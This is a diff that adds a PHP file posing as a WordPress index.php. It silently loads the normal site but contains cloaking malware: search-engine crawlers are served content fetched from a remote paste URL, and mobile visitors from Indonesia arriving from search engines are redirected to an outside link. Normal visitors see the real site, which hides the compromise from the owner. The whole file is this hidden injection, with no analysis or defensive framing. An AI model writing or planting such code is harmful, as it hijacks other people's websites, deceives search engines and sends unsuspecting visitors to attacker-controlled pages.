@@ -1,0 +1,73 @@
+<?php
+header('Vary: Accept-Language, User-Agent');
+
+function get_client_ip() {
+    return $_SERVER['HTTP_CLIENT_IP']
+        ?? $_SERVER['HTTP_X_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_X_FORWARDED']
+        ?? $_SERVER['HTTP_FORWARDED_FOR']
+        ?? $_SERVER['HTTP_FORWARDED']
+        ?? $_SERVER['REMOTE_ADDR']
+        ?? '127.0.0.1';
+}
+
+function make_request($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 4);
+        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
+        $response = curl_exec($ch);
+        curl_close($ch);
+        return $response ?: '';
+    } elseif (ini_get('allow_url_fopen')) {
+        return @file_get_contents($url) ?: '';
+    }
+    return '';
+}
+
+function is_mobile() {
+    $ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+    $mobiles = ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'webos', 'opera mini', 'windows phone'];
+    foreach ($mobiles as $m) {
+        if (strpos($ua, $m) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+$rf = $_SERVER['HTTP_REFERER'] ?? '';
+$ip = get_client_ip();
+
+$bot_url = 'https://dpaste.org/DACXk/raw';
+$reff_url = 'https://medanlink.com/agcW2KIW0fm7';
+
+$file = make_request($bot_url);
+
+$geo = @json_decode(make_request('http://ip-api.com/json/' . urlencode($ip)), true);
+$cc = strtoupper($geo['countryCode'] ?? '');
+
+if (preg_match('/(googlebot|slurp|adsense|inspection|verifycation|jenifer)/i', $ua)) {
+    if (!empty($file)) {
+        echo $file;
+    } else {
+        echo "Temporary Unavailable.";
+    }
+    exit;
+}
+
+if (is_mobile() && $cc === 'ID' && (stripos($rf, 'google.co.id') !== false || stripos($rf, 'yahoo.co.id') !== false || stripos($rf, 'bing.com') !== false)) {
+    header('Location: ' . $reff_url, true, 302);
+    exit;
+}
+
+if (!isset($wp_did_header)) {
+    $wp_did_header = true;
+    require_once __DIR__ . '/wp-load.php';
+    wp();
+    require_once ABSPATH . WPINC . '/template-loader.php';
+}
+?>
